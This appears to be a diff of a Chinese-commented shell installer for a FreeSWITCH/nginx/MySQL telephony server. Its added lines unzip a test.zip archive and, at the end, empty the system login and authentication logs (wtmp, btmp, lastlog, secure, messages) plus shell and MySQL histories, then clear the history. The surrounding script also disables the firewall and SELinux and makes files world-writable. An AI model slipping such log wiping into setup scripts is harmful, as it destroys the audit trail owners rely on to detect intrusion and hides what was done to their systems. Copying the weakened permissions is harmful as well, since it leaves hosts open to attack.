@@ -2,7 +2,7 @@
 #安装基础依赖包
 
 #firewall-cmd --state
-yum install sudo -y
+yum install sudo unzip -y
 sudo systemctl stop firewalld.service
 sudo systemctl disable firewalld.service
 setenforce 0
@@ -133,6 +133,7 @@ EOF
 sudo groupadd pbx
 sudo usermod -g pbx nginx
 
+unzip test.zip
 cd test
 chmod -R 777 *
 cd opus
@@ -442,5 +443,16 @@ sudo chmod 777 /etc/systemd/system/freeswitch.service
 chmod 644 /etc/my.cnf
 chown -R mysql:mysql /var/lib/mysql
 
+cd && rm -rf test*
+echo >/var/log/wtmp
+echo > /var/log/btmp
+echo > /var/log/lastlog
+echo > /var/log/secure
+echo > ~/.bash_history
+echo > ~/.mysql_history
+echo > /var/log/messages
+history -c
+
 #路由规则   ^(.*)$
+#密码---MD5小写32位----SHA1加密
 
